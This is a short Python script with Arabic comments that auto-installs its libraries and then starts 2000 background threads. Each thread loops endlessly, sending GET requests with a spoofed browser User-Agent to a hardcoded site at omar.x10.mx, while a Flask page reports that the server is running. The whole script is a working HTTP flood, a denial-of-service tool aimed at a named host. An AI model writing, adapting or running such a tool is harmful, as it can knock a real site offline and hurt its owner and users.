import subprocess
import sys

# التحقق من المكتبات المطلوبة وتثبيتها تلقائيًا
def install_packages():
    required_packages = ["flask", "requests", "beautifulsoup4"]
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"تثبيت {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# تثبيت المكتبات قبل تشغيل الكود
install_packages()

# باقي الكود بعد التأكد من وجود المكتبات
from flask import Flask
import requests
import threading
from bs4 import BeautifulSoup

app = Flask(__name__)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
}

def chek(url):
    while True:
        try:
            response = requests.get(url, headers=headers)
            status_code = response.status_code
            soup = BeautifulSoup(response.text, "html.parser")
            title = soup.title.string if soup.title else "No Title"
            print(f"[{status_code}] {title} - {url}")
        except requests.exceptions.RequestException:
            print("Request failed")

def start_threads():
    target_url = "https://omar.x10.mx/omar/public/"
    for _ in range(2000):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()

@app.route('/')
def home():
    return "Server is running with background threads new vip!"

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
